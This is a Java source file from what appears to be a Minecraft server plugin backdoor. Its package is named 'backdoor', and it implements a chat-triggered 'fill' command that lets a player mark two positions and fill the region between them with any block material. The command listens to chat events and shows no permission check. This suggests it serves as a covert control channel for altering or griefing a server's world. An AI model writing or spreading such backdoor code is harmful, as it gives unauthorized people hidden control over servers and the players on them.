package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.backdoor.filler.FillTask;
import me.tsb.backdoor.filler.PlayerRegion;
import me.tsb.plugin.Main;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "fill", aliases = {"fill"})
public class FillerCommand extends Command {
    Main main;

    public FillerCommand(Main main) {
        this.main = main;
    }

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        if (args.size() >= 1) {
            if (args.get(0).equalsIgnoreCase("pos1")) {
                main.getPlayerRegionTracker().getRegions().get(event.getPlayer().getUniqueId()).setPos1(event.getPlayer().getLocation());
            } else if (args.get(0).equalsIgnoreCase("pos2")) {
                main.getPlayerRegionTracker().getRegions().get(event.getPlayer().getUniqueId()).setPos2(event.getPlayer().getLocation());
            } else if (args.get(0).equalsIgnoreCase("fill")) {
                if (args.size() >= 2) {
                    PlayerRegion region = main.getPlayerRegionTracker().getRegions().get(event.getPlayer().getUniqueId());
                    if (region.getPos1() == null) {
                        event.getPlayer().sendMessage(ChatColor.RED + "Pos1 is null!");
                        return;
                    }
                    if (region.getPos2() == null) {
                        event.getPlayer().sendMessage(ChatColor.RED + "Pos2 is null!");
                        return;
                    }
                    Material material = Material.getMaterial(args.get(1));
                    if (material == null) {
                        event.getPlayer().sendMessage(ChatColor.RED + "Material is null!");
                        return;
                    }

                    FillTask fillTask = new FillTask(region.getPos1(), region.getPos2(), material, event.getPlayer());

                    main.getFiller().start(fillTask);
                }
            }
        }
    }
}
